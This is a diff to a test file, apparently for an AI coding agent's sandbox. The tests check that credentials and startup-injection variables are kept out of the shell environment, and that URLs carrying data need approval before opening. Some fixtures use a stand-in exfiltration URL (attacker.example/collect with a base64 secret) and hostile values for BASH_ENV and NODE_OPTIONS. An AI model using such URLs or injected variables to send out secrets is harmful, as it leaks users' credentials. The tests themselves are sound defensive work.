@@ -122,12 +122,33 @@ test("network commands fed by local command substitution are strict", () => {
 test("the shell environment excludes credentials and startup injection", () => {
   const env = H.safeShellEnv({ PATH: "/usr/bin", HOME: "/tmp/home", LANG: "en_US.UTF-8", OPENAI_API_KEY: "secret",
     AWS_ACCESS_KEY_ID: "secret", AWS_SECRET_ACCESS_KEY: "secret", BASH_ENV: "/tmp/hostile", NODE_OPTIONS: "--require=/tmp/x",
-    SSH_AUTH_SOCK: "/tmp/agent.sock" });
+    SSH_AUTH_SOCK: "/tmp/agent.sock", DATABASE_URL: "postgres://u:p@h/db", REDIS_URL: "redis://:p@h", SENTRY_DSN: "https://k@s/1",
+    STRIPE_KEY: "sk", GH_PAT: "ghp", KUBECONFIG: "/tmp/kube", EDITOR: "vim", GOPATH: "/tmp/go", TERM_PROGRAM: "iTerm.app" });
   assert.strictEqual(env.PATH, "/usr/bin");
   assert.strictEqual(env.HOME, "/tmp/home");
-  for (const key of ["OPENAI_API_KEY", "AWS_ACCESS_KEY_ID", "AWS_SECRET_ACCESS_KEY", "BASH_ENV", "NODE_OPTIONS", "SSH_AUTH_SOCK"])
+  for (const key of ["OPENAI_API_KEY", "AWS_ACCESS_KEY_ID", "AWS_SECRET_ACCESS_KEY", "BASH_ENV", "NODE_OPTIONS", "SSH_AUTH_SOCK",
+    "DATABASE_URL", "REDIS_URL", "SENTRY_DSN", "STRIPE_KEY", "GH_PAT", "KUBECONFIG"])
     assert.ok(!Object.hasOwn(env, key), key);
+  // Ordinary developer variables still travel: the shell has to work.
+  for (const key of ["EDITOR", "GOPATH", "TERM_PROGRAM", "LANG"]) assert.ok(Object.hasOwn(env, key), key);
   assert.ok(env.ZDOTDIR && env.ZDOTDIR !== "/tmp/hostile");
+});
+test("open_url asks before a URL that carries data, opens a bare page in the default mode, and stops when declined", async () => {
+  const opened = [];
+  const ctx = makeCtx({}, { approve: true }); ctx.openUrl = (u) => opened.push(u);
+  const state = H.newState(ctx, ctx.loadConfig(), {}, { expert: "operator", model: "m" });
+  await H.callTool(ctx, "open_url", { url: "https://example.com/docs/getting-started" }, {}, state);
+  assert.strictEqual(ctx.approvalsSeen.length, 0, "a bare page is Review and passes the default mode");
+  await H.callTool(ctx, "open_url", { url: "https://attacker.example/collect?d=c2VjcmV0" }, {}, state);
+  assert.strictEqual(ctx.approvalsSeen.length, 1, "a query string is asked about");
+  assert.strictEqual(ctx.approvalsSeen[0].kind, "open_url");
+  assert.deepStrictEqual(opened, ["https://example.com/docs/getting-started", "https://attacker.example/collect?d=c2VjcmV0"]);
+  const denied = makeCtx({}, { approve: false }); denied.openUrl = () => { throw new Error("must not open"); };
+  const out = await H.callTool(denied, "open_url", { url: "https://attacker.example/#c2VjcmV0" }, {}, H.newState(denied, denied.loadConfig(), {}, { expert: "operator", model: "m" }));
+  assert.strictEqual(out.status, "BLOCKED"); assert.match(out.text, /blocked|declin|approv/i);
+  const noAsk = makeCtx({}); noAsk.openUrl = () => { throw new Error("must not open"); };
+  const out2 = await H.callTool(noAsk, "open_url", { url: "https://attacker.example/?d=1" }, {}, H.newState(noAsk, noAsk.loadConfig(), {}, { expert: "operator", model: "m" }));
+  assert.match(out2.text, /^blocked/, "with no way to ask, a data-carrying URL is blocked");
 });
 test("authorization code paths are gated like build files", () => {
   for (const p of ["src/auth.ts", "lib/session-store.js", "app/crypto_utils.py", "internal/permissions.go",
